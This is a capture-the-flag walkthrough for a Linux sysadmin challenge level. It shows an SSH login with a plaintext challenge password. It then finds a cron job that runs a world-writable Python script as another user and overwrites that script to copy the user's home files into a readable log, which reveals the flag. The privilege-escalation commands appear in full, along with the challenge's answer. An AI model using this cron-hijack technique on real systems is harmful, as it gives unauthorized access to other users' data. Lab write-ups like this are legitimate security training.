# **Level 8**

![](https://i.imgur.com/VRjilzP.png)

```shell
sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@challenges.ringzer0team.com -p 10147
```

![](https://i.imgur.com/qj5scDR.png)

ow we must search for files that are owned by `cypher` and are readable for `morpheus`:

```shell
morpheus@lxc-sysadmin:~$ cd /tmp
morpheus@lxc-sysadmin:/tmp$ mkdir notsurprised
morpheus@lxc-sysadmin:/tmp$ cd notsurprised
morpheus@lxc-sysadmin:/tmp/notsurprised$ cp /backup/* .
morpheus@lxc-sysadmin:/tmp/notsurprised$ for i in *; do tar -xf $i; done
morpheus@lxc-sysadmin:/tmp/notsurprised$ ls -ltR
.:
total 80
drwxrwxr-x 4 morpheus morpheus  4096 Jun 15 08:24 var
-rw-r--r-- 1 morpheus morpheus 40960 Jun 15 08:24 3dab3277410dddca016834f91d172027
-rw-r--r-- 1 morpheus morpheus 10240 Jun 15 08:24 776d27d2a429e63bbc3cb29183417bb2
-rw-r--r-- 1 morpheus morpheus 20480 Jun 15 08:24 c074fa6ec17bb35e168366c43cf4cd19
-rw-r--r-- 1 morpheus morpheus 10240 Jun 15 08:24 ca584b15ae397a9ad45b1ff267b55796
drwxrwxr-x 3 morpheus morpheus  4096 Sep 15  2014 home
drwxrwx--x 2 morpheus morpheus  4096 Mar 13  2014 tmp

./var:
total 8
drwxrwxr-x 3 morpheus morpheus 4096 Jun 15 08:24 spool
drwxrwxr-x 2 morpheus morpheus 4096 Jun 15 08:24 log

./var/spool:
total 4
drwxr-xr-x 5 morpheus morpheus 4096 Feb 25  2014 cron

./var/spool/cron:
total 12
drwx-wx--- 2 morpheus morpheus 4096 Mar 13  2014 crontabs
drwxrwx--- 2 morpheus morpheus 4096 Feb 25  2014 atjobs
drwxrwx--- 2 morpheus morpheus 4096 Jun  9  2012 atspool

./var/spool/cron/crontabs:
total 4
-rw------- 1 morpheus morpheus 1126 Mar 13  2014 cypher

./var/spool/cron/atjobs:
total 0

./var/spool/cron/atspool:
total 0

./var/log:
total 40
-rw-r----- 1 morpheus morpheus 37172 Mar 13  2014 syslog

./home:
total 4
drwxr-x--- 3 morpheus morpheus 4096 Sep 15  2014 oracle

./home/oracle:
total 0

./tmp:
total 4
-rwxrwxr-x 1 morpheus morpheus 54 Mar 13  2014 Gathering.py
```

Here's the major part :
```shell
./var/spool/cron/crontabs:
total 4
-rw------- 1 morpheus morpheus 1126 Mar 12  2014 cypher
```

As you can see there is `cypher`'s' user cron job.

```shell
morpheus@lxc-sysadmin:/tmp/notsurprised$ cat ./var/spool/cron/crontabs/cypher
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.f7mcQy/crontab installed on Wed Mar 12 22:02:27 2014)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/3 * * * * python /tmp/Gathering.py
```

So every 3 minutes python `/tmp/Gathering.py` gets executed. If we look closer, we'll notice that the Python file is executed as user `cypher` in `syslog`:

```shell
morpheus@lxc-sysadmin:/tmp/notsurprised$ grep -r "cypher" *
`Binary file 3dab3277410dddca016834f91d172027 matches
Binary file 776d27d2a429e63bbc3cb29183417bb2 matches
Binary file ca584b15ae397a9ad45b1ff267b55796 matches
tmp/Gathering.py:os.system("ps aux > /home/cypher/info.txt")`
var/log/syslog:Mar 12 22:01:58 forensics crontab[1662]: (cypher) BEGIN EDIT (cypher)
var/log/syslog:Mar 12 22:02:27 forensics crontab[1662]: (cypher) REPLACE (cypher)
var/log/syslog:Mar 12 22:02:27 forensics crontab[1662]: (cypher) END EDIT (cypher)
var/log/syslog:Mar 12 22:03:01 forensics /USR/SBIN/CRON[1682]: (cypher) CMD (python /tmp/Gathering.py)
var/log/syslog:Mar 12 22:06:01 forensics /USR/SBIN/CRON[1857]: (cypher) CMD (python /tmp/Gathering.py)
var/log/syslog:Mar 12 22:09:01 forensics /USR/SBIN/CRON[2269]: (cypher) CMD (python /tmp/Gathering.py)
```

Now, we need to exploit this python script to read all files under `/home/cypher/*` and redirect/print all the STDOUT to some where we can read rather than `/home/cypher/info.txt`.

```shell
morpheus@lxc-sysadmin:/tmp/notsurprised$ touch /tmp/gather.log
morpheus@lxc-sysadmin:/tmp/notsurprised$ chmod 777 /tmp/gather.log
morpheus@lxc-sysadmin:/tmp/notsurprised$ cat /tmp/Gathering.py
import os
os.system('ps aux > /tmp/28JNvE05KBltE8S7o2xu')
morpheus@lxc-sysadmin:/tmp/notsurprised$ echo 'import os' > /tmp/Gathering.py
morpheus@lxc-sysadmin:/tmp/notsurprised$ echo 'os.system("cat /home/cypher/*.* > /tmp/gather.log")' >> /tmp/Gathering.py
morpheus@lxc-sysadmin:/tmp/notsurprised$ cat /tmp/Gathering.py
import os
os.system("cat /home/cypher/*.* > /tmp/gather.log")
```

Cause my `ESC` key is broken, or we can modify it simply by `vim`.

This script executed by `cypher`(with its' own permission) every 3 minute, let wait and see.

```shell
morpheus@lxc-sysadmin:/tmp/notsurprised$ ls -l /tmp/gather.log
-rwxrwxrwx 1 morpheus morpheus 0 Jun 15 08:28 /tmp/gather.log
morpheus@lxc-sysadmin:/tmp/notsurprised$ ls -l /tmp/gather.log
-rwxrwxrwx 1 morpheus morpheus 0 Jun 15 08:28 /tmp/gather.log
morpheus@lxc-sysadmin:/tmp/notsurprised$ ls -l /tmp/gather.log
-rwxrwxrwx 1 morpheus morpheus 14008 Jun 15 08:39 /tmp/gather.log
morpheus@lxc-sysadmin:/tmp/notsurprised$ cat /tmp/gather.log
BASE ?
RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0  10656   664 ?        Ss   Jan14   1:04 init [2]  
root         2  0.0  0.0      0     0 ?        S    Jan14   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    Jan14   1:36 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S    Jan14   0:00 [kworker/u:0]
......
```

Now, base64 decode the flag.

```shell
morpheus@lxc-sysadmin:/tmp/notsurprised$ echo "RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=" | base64 -d
FLAG-pys3gfczt9pDkEz2io0Pwd8KNz
```

The flag is `FLAG-pys3gfczt9pDkEz2io0Pwd8KNz`.